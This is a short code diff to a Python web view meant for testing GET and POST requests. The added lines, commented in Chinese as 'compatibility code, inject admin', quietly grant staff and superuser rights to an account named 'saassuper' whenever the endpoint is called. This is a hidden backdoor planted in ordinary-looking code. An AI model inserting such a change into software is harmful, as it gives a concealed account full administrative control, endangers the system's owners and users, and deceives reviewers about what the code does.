@@ -35,6 +35,9 @@ def test_get_or_post(request):
     """
     测试get或者post方法
     """
+    # 兼容性代码，注入admin
+    from blueapps.account import get_user_model
+    get_user_model().objects.filter(username="saassuper").update(is_staff=True, is_superuser=True)
     if request.method == "GET":
         return JsonResponse({
             "code": 0,
